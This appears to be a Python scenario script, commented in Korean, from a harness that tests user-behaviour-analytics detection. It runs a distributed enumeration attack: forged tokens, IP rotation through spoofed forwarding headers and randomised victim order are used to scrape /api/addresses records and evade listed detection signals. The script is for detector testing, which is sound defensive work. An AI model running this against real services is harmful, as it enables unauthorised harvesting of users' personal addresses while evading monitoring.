"""
S5b — IP Pool 분산 + sub random 선택 (분산 enumeration).

행위:
- [START, END) 범위에서 VICTIM_COUNT명을 랜덤 비복원 추출 → 각 1회 공격
- sub는 랜덤 순서 (글로벌 단조 패턴 없음)
- 매 요청 IP random (XFF 위조로 IP 분산)
- 매 호출 새 jti (key 탈취 가정, forge_token)

회피하는 신호:
- 단일 IP × 다수 sub (5분 윈도우 다양성) — IP 풀 분산으로 회피
- **글로벌 sub 단조 패턴** — sub 랜덤 선택으로 회피
- jti 재사용 — 매번 새 jti

회피하지 못하는 신호:
- **ASN 단위 다양성 (Route B)** — sub를 랜덤화해도 ip_asn으로 재집계하면
  한 ASN의 unique sub 수는 그대로다 (Route B는 sub 순서가 아니라 개수를
  센다). 그래서 S5(순차)·S5b(랜덤)를 동일하게 잡는다.
- (구 설계 메모) "F-FirstSeen-Sensitive" 보완 factor는 구현돼 있지 않다 —
  Route B가 분산 enumeration 탐지를 담당한다.

핵심 메시지:
    "완전 분산(IP 풀 + sub 랜덤) 공격도 UBA의 ASN 단위 다양성(Route B)으로 탐지".

S4 / S5와의 차이 (셋 다 각 사용자 정확히 1회 방문, 총 VICTIM_COUNT건):
    S4  — 단일 IP, sub 순차
    S5  — IP 분산,  sub 순차
    S5b — IP 분산,  sub random 선택   ← 이 파일

세 시나리오 모두 총 호출량·호출 방식이 동일. 다른 건 IP / sub 선택 전략뿐.

NOTE: 한 계정을 여러 번 조회하는 분포(쿠팡식 복원추출 — 2,300 IP × 3,367 계정)가
      필요하면 별도 시나리오로 추가할 것. 본 시나리오는 각 사용자 1회로 통일한다.
"""
import os
import sys
import time
import random
import argparse
from pathlib import Path

from dotenv import load_dotenv

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))

from lib.token_forge import forge_token
from lib.target_pool import get_shuffled_pool
from lib.ip_pool import get_distributed_ips, COUPANG_IP_TO_ACCOUNT_RATIO
from lib.http_client import get_session, call_api
from lib.result_writer import ResultWriter

load_dotenv(_ROOT / ".env")


def run_s5b(
    duration_minutes: float = None,
    ip_pool_size: int = None,
    interval: float = None,
):
    """
    Parameters
    ----------
    duration_minutes : 공격 지속 시간 (분). 주어지면 interval 자동 계산.
    ip_pool_size     : IP 풀 크기 (없으면 .env S5_IP_POOL_SIZE → 자동)
    interval         : 요청 간 sleep (초). 기본 1.0s (= S4 페이스, 분당 60건).
    """
    session = get_session()

    # 범위에서 VICTIM_COUNT명 랜덤 비복원 추출 (seed=None → 매 실행 다른 표본)
    victims = get_shuffled_pool(seed=None)
    victim_count = len(victims)

    # IP 풀: 쿠팡 비율 기본 (계정 × 0.683, lib/ip_pool.COUPANG_IP_TO_ACCOUNT_RATIO)
    ip_pool_size = ip_pool_size or int(os.environ.get("S5_IP_POOL_SIZE", 0))
    if not ip_pool_size:
        ip_pool_size = max(2, round(victim_count * COUPANG_IP_TO_ACCOUNT_RATIO))

    ip_pool = get_distributed_ips(count=ip_pool_size)
    total_requests = victim_count  # 각 사용자 1회 = S4/S5와 동일 호출량

    if duration_minutes is not None:
        interval = (duration_minutes * 60) / max(1, total_requests)
    elif interval is None:
        interval = 1.0  # S4와 동일 페이스 (분당 60건)
    eta_min = total_requests * interval / 60

    rng = random.Random()

    print(f"[S5b] === IP Pool 분산 + sub random 선택 (각 사용자 1회) ===")
    print(f"[S5b]   victim pool   : {victim_count}명 (랜덤 비복원 추출)")
    print(f"[S5b]   IP pool       : {ip_pool_size}개 (random per request)")
    print(f"[S5b]   total requests: {total_requests:,}건 (각 사용자 1회)")
    print(f"[S5b]   interval      : {interval:.3f}s  → eta {eta_min:.1f}min")
    print(f"[S5b]   IP 샘플       : {ip_pool[:5]} ...")

    writer = ResultWriter("S5b")

    try:
        for victim_id in victims:
            # victim은 사전 추출된 표본을 1회씩, IP만 매 요청 랜덤
            src_ip = rng.choice(ip_pool)
            token = forge_token(victim_id)
            path = f"/api/addresses/{victim_id}"

            try:
                resp = call_api(session, path, token, src_ip=src_ip)
                writer.record(victim_id, src_ip, "GET", path, resp)
            except Exception as e:
                writer.record_error(victim_id, src_ip, path, e)

            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[S5b] 사용자 중단")
    finally:
        writer.close()

    avg_per_ip = writer.total / max(1, ip_pool_size)
    print(f"[S5b] 분포 — 계정당 1건(각 사용자 1회), IP당 평균 {avg_per_ip:.1f}건")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--duration", type=float, default=None,
                        help="공격 지속 시간 (분). 주어지면 페이스 자동 계산.")
    parser.add_argument("--ip-pool-size", type=int, default=None,
                        help="IP 풀 크기 (기본: 계정 풀 × 0.68)")
    parser.add_argument("--interval", type=float, default=None,
                        help="요청 간 sleep (초). 기본 1.0s (S4와 동일 페이스).")
    args = parser.parse_args()
    run_s5b(
        args.duration,
        args.ip_pool_size,
        args.interval,
    )
